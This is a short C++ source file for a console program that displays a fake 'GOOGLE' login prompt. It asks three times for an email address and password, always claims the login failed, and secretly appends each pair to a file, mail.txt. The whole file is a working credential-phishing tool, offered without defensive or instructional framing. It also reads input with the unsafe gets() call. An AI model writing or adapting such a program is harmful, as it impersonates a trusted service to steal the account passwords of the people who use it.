#include<fstream.h>
#include<conio.h>
#include<stdio.h>
void np()
{
textbackground(WHITE);
textcolor(RED);
clrscr();
}


void main()
{
  clrscr();
  cout<<"\n\n\t\t\t\tGOOGLE\n\n";
  char mail[30],pass[30];
  ofstream put("mail.txt",ios::out|ios::app);
  for(int i=0;i<3;i++)
  {
  cout<<"\n\n\tEnter your Mail ID :";
  gets(mail);
  cout<<"\n\n\tEnter Password :";
  gets(pass);
  put<<"\nMAIL:"<<mail<<"\nPASSWORD:"<<pass;
  if(i!=2)
  {
  cout<<"\n\n SORRY!!! MailID or Password error!!!Press any key to try again.";
  np();
  }

  else
  cout<<"\n\nSORRY!!! You have tried your maximum tries. Press any key to Exit";

  getch();
  }

  put.close();









  getch();
}
